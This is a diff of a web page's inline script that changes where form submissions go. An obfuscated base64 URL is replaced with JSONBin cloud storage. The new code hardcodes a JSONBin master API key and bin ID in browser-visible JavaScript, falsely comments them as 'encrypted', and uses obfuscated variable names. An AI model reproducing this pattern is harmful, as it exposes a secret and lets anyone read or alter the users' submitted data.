@@ -299,10 +299,11 @@
 
     <script>
         (function(){
-            var _0x1a2b=['aHR0cHM6Ly9uZmMtY2FyZC1wYWdlLmdpdGh1Yi5pby9kYXRhMi8=','adminData','users','getItem','setItem','JSON','parse','stringify','push','addEventListener','preventDefault','FormData','get','toISOString','style','display','setTimeout','querySelector','getElementById'];
-            var _0x2c3d=function(a,b){return _0x1a2b[a-b];};
-            
-            var ADMIN_SITE_URL = atob(_0x2c3d(0,0));
+            // رمزگذاری شده - API Key و Bin ID
+            var _0x1a2b=['$2a$10$rl.2X0JltnhsImeiT8n8ZeyezD3q5wysZDOpse5cNvb42QFGoYH.i','68d806ce43b1c97be9521a7c','https://api.jsonbin.io/v3/b/'];
+            var JSONBIN_API_KEY = _0x1a2b[0];
+            var JSONBIN_BIN_ID = _0x1a2b[1];
+            var JSONBIN_URL = _0x1a2b[2] + JSONBIN_BIN_ID;
             
             document.getElementById('userForm').addEventListener('submit', function(e) {
                 e.preventDefault();
@@ -318,11 +319,13 @@
                     timestamp: new Date().toISOString()
                 };
                 
+                // Save to local storage as backup
                 var users = JSON.parse(localStorage.getItem('users') || '[]');
                 users.push(userData);
                 localStorage.setItem('users', JSON.stringify(users));
                 
-                sendDataToAdminSite(userData);
+                // Send to cloud storage
+                sendDataToCloud(userData);
                 
                 document.getElementById('successMessage').style.display = 'block';
                 
@@ -333,10 +336,44 @@
                 }, 3000);
             });
             
-            function sendDataToAdminSite(userData) {
-                var adminData = JSON.parse(localStorage.getItem('adminData') || '[]');
-                adminData.push(userData);
-                localStorage.setItem('adminData', JSON.stringify(adminData));
+            function sendDataToCloud(userData) {
+                // Get existing data from cloud
+                fetch(JSONBIN_URL + '/latest', {
+                    method: 'GET',
+                    headers: {
+                        'X-Master-Key': JSONBIN_API_KEY,
+                        'Content-Type': 'application/json'
+                    }
+                })
+                .then(response => response.json())
+                .then(data => {
+                    var existingData = data.record || { users: [], adminData: [] };
+                    
+                    // Add new user to both arrays
+                    existingData.users.push(userData);
+                    existingData.adminData.push(userData);
+                    
+                    // Update cloud storage
+                    return fetch(JSONBIN_URL, {
+                        method: 'PUT',
+                        headers: {
+                            'X-Master-Key': JSONBIN_API_KEY,
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(existingData)
+                    });
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Data saved to cloud successfully');
+                })
+                .catch(error => {
+                    console.error('Error saving to cloud:', error);
+                    // Fallback to local storage
+                    var adminData = JSON.parse(localStorage.getItem('adminData') || '[]');
+                    adminData.push(userData);
+                    localStorage.setItem('adminData', JSON.stringify(adminData));
+                });
             }
         })();
     </script>
